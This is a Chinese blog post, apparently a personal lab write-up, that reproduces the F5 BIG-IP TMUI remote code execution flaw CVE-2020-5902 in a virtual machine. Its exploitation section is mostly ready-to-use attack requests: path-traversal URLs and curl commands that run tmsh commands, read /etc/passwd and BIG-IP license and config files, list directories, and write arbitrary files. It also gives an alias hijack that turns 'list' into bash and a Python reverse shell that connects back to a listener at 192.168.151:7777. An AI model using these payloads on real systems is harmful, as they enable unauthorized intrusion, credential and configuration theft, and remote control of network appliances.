# F5 BIG-IP 远程代码执行 RCE（CVE-2020-5902）环境搭建及复现 - 空城-1 - 博客园

> 原文：[`www.cnblogs.com/hcrk/p/13475974.html`](https://www.cnblogs.com/hcrk/p/13475974.html)

漏洞简介

F5 BIG-IP 是美国``F5 公司一款集成流量管理、DNS、出入站规则、web 应用防火墙、web 网关、负载均衡等功能的应用交付平台。 在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞，导致可以未授权访问 TMUI 模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。

搭建环境

直接再 F5 官网下载即可：（先去注册）

```
https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&pro=big-ip_v11.x&ver=11.6.4
```

![](img/12d6a9849be613e4f9eeb6f0b0122cd0.png)

 ![](img/54eed667cfec76182af96078f460af5f.png)

 ![](img/d26d7dc89c54abef2e7b618af9a725f0.png)

 ![](img/0351722f382f6f5f3b7da23d0ff08fc5.png)

下载好直接导入虚拟机即可。

其他配置和搭建虚拟机一样。

使用默认密码： root-default 登录（linux 下输密码不显示）（然后需要你修改密码，否则不行）

配置 ip 地址 输入 config

 ![](img/fe6debf9a08fa93b872ece6aa6319e79.png)

 配置 ip，其实不用配置也想，弄个 NAT 就可以了。主要是网卡较多。

 ![](img/81222ba65d5085483d8c9bf301a36d5b.png)

漏洞复现

访问管理员页面

```
https://192.168.110.151/tmui/login.jsp

```

　　![](img/11aa0927a4f92c10a39130c8d2bd84f5.png)

 利用 poc 进行测试利用

```
RCE: 
curl -v -k  'https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'

Read File: 
curl -v -k  'https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
```

```
Read File:
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf

RCE:
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin

List File:
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/

```

　　![](img/c93ea02fb452731ec69203f31d9ca025.png)

 ![](img/bbb98d8202dc752ddb45c17c2c683c6b.png)

 在执行命令时发现权限不足，不知为何，现在也没研究出来，用 fofa 搜索的也是权限不足，执行不了 Tmsh 命令（list 相当于 bash 命令），一开始不知的我，以为这个命令可以执行 linux 命令。所以就尝试了，whoami

哈哈哈，菜鸡的我，怎么会想到这个，打自己一巴掌。

![](img/f570139b6151d3e69dcd9f2cf64322c1.png)

尝试写文件：（测试下面如何拿到反弹 shell 的）

```
尝试写入：（在靶机上面写）
curl -k -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "fileName=/tmp/success&content=CVE-2020-5902" "https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"
读取
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success"

```

![](img/7511f67d7bc04e46eee6100e28d5bc9d.png)

访问发现已经改变了。

 ![](img/167e10762da0bcaedb5fb89aec6af0a2.png)

获取 shell

```
1、修改 alias 劫持 list 命令为 bash
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
2、写入文件：bash 文件
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content=id
3、执行 bash 文件
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test
4\. 还原 list 命令
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list

```

![](img/c83b565c3fcc8750ed175bb8cbca58ce.png)

 还是权限不足，太难了。

![](img/02295352dad3aba6d1e3b8eb67764359.png)

直接用靶机进行配置。

![](img/559f5488be3b07a61c0b889070d52d52.png)

 还是不行。

![](img/8fc26e399d1ed0fe4d1976fd791bf719.png)

 算了算了，我低头了。

![](img/019669907ca4fdc9984729af11dc1c58.png)

 下一步，说如何反弹 shell 吧。

来一道 py 反弹 shell：（是一句话，为了方便我空格了）

```
https://192.168.110.151/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content=python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.151',7777));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

用一个机器监听端口

![](img/a0d6e670f67098ea6e3de991a4af0d32.png)

 在执行下面命令，别人的 shell 就掌握手中了。

```
https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test

```

![](img/f1d2d33f26d6c6963bafccdc797df11f.png)

 我的不行，权限问题。在此请求大佬们多多给建议，让我跟着大佬们脚步继续前进。

```
参考链接：
https://zhuanlan.zhihu.com/p/161674340
https://www.cnblogs.com/twosmi1e/p/13290290.html
https://www.cnblogs.com/zzjdbk/p/13290086.html	
https://blog.csdn.net/wuyou1995/article/details/107170186

```